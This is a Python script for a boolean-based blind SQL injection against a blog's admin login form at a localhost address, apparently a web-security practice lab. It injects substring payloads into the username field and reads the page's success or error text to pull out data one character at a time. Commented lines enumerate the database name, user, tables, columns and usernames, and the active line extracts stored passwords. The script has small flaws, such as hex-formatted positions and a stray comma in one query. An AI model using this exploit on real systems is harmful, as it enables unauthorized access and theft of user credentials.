import sys
import requests

url = 'http://localhost/web_security/blog/admin_login.php'

for i in range(1, 20):
    for c in range(0x20, 0x7f):
        # username = "xyz' OR BINARY substring(database(),1,1) = 'a' -- "
        # username = "xyz' OR BINARY substring(database(),'%x',1) = '%s' -- " % (i, chr(c))
        # username = "xyz' OR BINARY substring(user(),'%x',1) = '%s' -- " % (i, chr(c))
        # username = "xyz' OR BINARY substring((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'blog'),'%x',1) = '%s' -- " % (i, chr(c))
        # username = "xyz' OR BINARY substring((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = 'blog' AND table_name='user'),'%x',1) = '%s' -- " % (i, chr(c))
        # username = "xyz' OR BINARY substring((SELECT group_concat(username), FROM user),'%x',1) = '%s' -- " % (i, chr(c))
        username = "xyz' OR BINARY substring((SELECT group_concat(password) FROM user),'%x',1) = '%s' -- " % (i, chr(c))
        
        password = "12345"

        form = {'username': username, 'password': password, 'submit': 'Login'}

        response = requests.post(url, data=form)

        if "Halaman administrasi blog" in response.text:
            status = True
        elif "Username atau password salah" in response.text:
            status = False

        if status:
            # print(chr(c))
            sys.stdout.write(chr(c))
            sys.stdout.flush()
            break
print('')